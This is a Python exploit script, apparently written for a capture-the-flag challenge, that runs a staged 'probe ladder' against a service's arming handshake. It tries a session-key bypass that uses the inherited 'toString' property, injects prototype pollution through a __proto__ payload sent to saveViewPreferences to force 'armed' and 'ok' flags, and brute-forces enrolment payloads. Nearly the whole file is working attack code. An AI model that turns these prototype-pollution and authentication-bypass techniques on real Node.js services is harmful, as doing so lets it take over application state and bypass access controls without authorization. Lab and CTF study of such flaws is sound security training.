#!/usr/bin/env python3
"""
Probe ladder for the fluxion FCP arming handshake.  CTF_TARGET must be set.

Cheapest and most likely first:
  A  baseline error map for every opcode
  B  the "toString" session trick: if FCP keeps sessions in a PLAIN object keyed
     by the 8 session bytes decoded as utf8, then a session of exactly b"toString"
     resolves to Object.prototype.toString, which is truthy, so `if (!sess)` passes
     with no HELLO at all.  8 bytes is exactly the length of "toString".
  C  prototype pollution of the session table through saveViewPreferences
     (server.js mergeDeep has no __proto__ deny list), for several key encodings
  D  HELLO payload candidates from the deterministic keyless generators the
     handout exports but never uses (cosmeticId, makeLabelTokenizer)
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fcp                                                    # noqa: E402
import solve as S                                             # noqa: E402

OPS = {1: "HELLO", 2: "KEX", 3: "ARM", 4: "TICK"}


def t(label, op, session=fcp.ZERO, payload=b""):
    r = fcp.call(op, session, payload)
    print("%-46s %-5s -> %s" % (label, OPS.get(op, op), r.get("text", r)))
    return r.get("text", "")


def stage_a():
    print("== A baseline ==")
    for op in (1, 2, 3, 4):
        t("zero session", op)


def stage_b():
    print("== B toString session ==")
    for op in (1, 2, 3, 4):
        t('session=b"toString"', op, b"toString")
    for s in (b"valueOf\x00", b"\x00valueOf", b"length\x00\x00"):
        t("session=%r" % s, 3, s)


def pollute(key, value):
    S.rpc("saveViewPreferences", {"prefs": {"__proto__": {key: value}}})


def stage_c():
    print("== C prototype pollution of the session table ==")
    cands = ["0000000000000000", "AAAAAAAAAAA", "AAAAAAAAAAAAAAAA=", "0",
             "\x00" * 8, "00000000-0000-0000"]
    for k in cands:
        pollute(k, {"stage": "kex", "rung": 99, "rungs": 0, "ok": True,
                    "armed": True, "device": "op", "ticks": 99})
        print("  polluted %r" % k)
    for op in (2, 3, 4):
        t("after pollution, zero session", op)


def stage_d(path="artifacts/deterministic_ids.jsonl"):
    print("== D deterministic enrol ids as HELLO payload ==")
    rows = [json.loads(l) for l in open(path)]
    for row in rows:
        for cand in [row["cosmetic"]] + row["label3"][:1]:
            r = t("%s %s" % (row["label"], cand), 1, fcp.ZERO, cand.encode())
            if r != "E_ENROLL_SIG":
                print("  !!! DIFFERENT: %s %s -> %s" % (row["label"], cand, r))
                return cand
    return None


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "abcd"
    if "a" in which:
        stage_a()
    if "b" in which:
        stage_b()
    if "c" in which:
        stage_c()
    if "d" in which:
        stage_d()
